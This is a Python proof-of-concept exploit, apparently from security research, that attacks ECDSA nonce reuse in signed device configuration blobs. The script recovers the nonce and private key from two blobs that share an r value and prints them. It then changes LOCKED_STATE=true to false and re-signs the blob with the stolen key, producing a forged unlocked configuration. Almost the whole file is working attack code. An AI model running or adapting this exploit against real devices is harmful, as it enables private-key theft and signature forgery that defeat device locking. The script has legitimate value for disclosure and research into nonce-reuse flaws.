#!/usr/bin/env python3

# Copyright 2020, Verizon Media
# Licensed under the terms of the MIT license. See LICENSE file in project root for terms.

# Modified from https://github.com/andreacorbellini/ecc/blob/master/scripts/ecdsa.py
# Copyright (c) 2015 Andrea Corbellini

import binascii
import collections
import random
import sys
from Crypto.Hash import SHA256

EllipticCurve = collections.namedtuple('EllipticCurve', 'name p a b g n h')

curve = EllipticCurve(
    'secp256r1',
    # Field characteristic.
    p=0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff,
    # Curve coefficients.
    a=0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc,
    b=0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b,
    # Base point.
    g=(0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
       0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5),
    # Subgroup order.
    n=0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551,
    # Subgroup cofactor.
    h=1,
)

if len(sys.argv) < 2:
    print("Usage: {} outfile".format(sys.argv[0]))
    sys.exit(1)

outfn = sys.argv[1]

print("Paste first configuration data blob now")

i = 0
lines = []
while i < 12:
    lines.append(input())
    i += 1

allbytes_hex = ''.join(lines)
allbytes_bin = binascii.unhexlify(allbytes_hex)

r1 = allbytes_bin[:32]
s1 = allbytes_bin[32:64]
old_blob_payload = allbytes_bin[64:]

print("Paste second configuration data blob now")

i = 0
lines = []
while i < 12:
    lines.append(input())
    i += 1

allbytes_hex = ''.join(lines)
allbytes_bin = binascii.unhexlify(allbytes_hex)

r2 = allbytes_bin[:32]
s2 = allbytes_bin[32:64]
second_blob_payload = allbytes_bin[64:]

assert r1 == r2

# Modular arithmetic ##########################################################

def inverse_mod(k, p):
    """Returns the inverse of k modulo p.

    This function returns the only integer x such that (x * k) % p == 1.

    k must be non-zero and p must be a prime.
    """
    if k == 0:
        raise ZeroDivisionError('division by zero')

    if k < 0:
        # k ** -1 = p - (-k) ** -1  (mod p)
        return p - inverse_mod(-k, p)

    # Extended Euclidean algorithm.
    s, old_s = 0, 1
    t, old_t = 1, 0
    r, old_r = p, k

    while r != 0:
        quotient = old_r // r
        old_r, r = r, old_r - quotient * r
        old_s, s = s, old_s - quotient * s
        old_t, t = t, old_t - quotient * t

    gcd, x, y = old_r, old_s, old_t

    assert gcd == 1
    assert (k * x) % p == 1

    return x % p


# Functions that work on curve points #########################################

def is_on_curve(point):
    """Returns True if the given point lies on the elliptic curve."""
    if point is None:
        # None represents the point at infinity.
        return True

    x, y = point

    return (y * y - x * x * x - curve.a * x - curve.b) % curve.p == 0


def point_neg(point):
    """Returns -point."""
    assert is_on_curve(point)

    if point is None:
        # -0 = 0
        return None

    x, y = point
    result = (x, -y % curve.p)

    assert is_on_curve(result)

    return result


def point_add(point1, point2):
    """Returns the result of point1 + point2 according to the group law."""
    assert is_on_curve(point1)
    assert is_on_curve(point2)

    if point1 is None:
        # 0 + point2 = point2
        return point2
    if point2 is None:
        # point1 + 0 = point1
        return point1

    x1, y1 = point1
    x2, y2 = point2

    if x1 == x2 and y1 != y2:
        # point1 + (-point1) = 0
        return None

    if x1 == x2:
        # This is the case point1 == point2.
        m = (3 * x1 * x1 + curve.a) * inverse_mod(2 * y1, curve.p)
    else:
        # This is the case point1 != point2.
        m = (y1 - y2) * inverse_mod(x1 - x2, curve.p)

    x3 = m * m - x1 - x2
    y3 = y1 + m * (x3 - x1)
    result = (x3 % curve.p,
              -y3 % curve.p)

    assert is_on_curve(result)

    return result


def scalar_mult(k, point):
    """Returns k * point computed using the double and point_add algorithm."""
    assert is_on_curve(point)

    if k % curve.n == 0 or point is None:
        return None

    if k < 0:
        # k * point = -k * (-point)
        return scalar_mult(-k, point_neg(point))

    result = None
    addend = point

    while k:
        if k & 1:
            # Add.
            result = point_add(result, addend)

        # Double.
        addend = point_add(addend, addend)

        k >>= 1

    assert is_on_curve(result)

    return result

def hash_message(x):
    h = SHA256.new()
    h.update(x)
    d = h.digest()
    return int.from_bytes(d, 'big')

def sign_message(private_key, message):
    z = hash_message(message)

    r = 0
    s = 0

    while not r or not s:
        k = random.randrange(1, curve.n)
        x, y = scalar_mult(k, curve.g)

        r = x % curve.n
        s = ((z + r * private_key) * inverse_mod(k, curve.n)) % curve.n

    return (r, s)

# This part recovers the private key
r1 = int.from_bytes(r1, 'big')
s1 = int.from_bytes(s1, 'big')
r2 = int.from_bytes(r2, 'big')
s2 = int.from_bytes(s2, 'big')

z1 = hash_message(old_blob_payload)
z2 = hash_message(second_blob_payload)
rec_k = ((z1 - z2) * inverse_mod(s1 - s2, curve.n)) % curve.n
print("Pwning - k = {:x}".format(rec_k))
rec_privk = (((s1 * rec_k - z1) % curve.n) * inverse_mod(r1, curve.n)) % curve.n
print("Pwning - private key = {:x}".format(rec_privk))

# Create and sign new blob
blob_payload_modified = old_blob_payload.strip().replace(b"LOCKED_STATE=true", b"LOCKED_STATE=false")
blob_payload_modified = blob_payload_modified + b" " * (128 - len(blob_payload_modified))

new_r, new_s = sign_message(rec_privk, blob_payload_modified)

rr = int.to_bytes(new_r, 32, 'big')
ss = int.to_bytes(new_s, 32, 'big')

with open(outfn, 'wb') as f:
    f.write(rr)
    f.write(ss)
    f.write(blob_payload_modified)
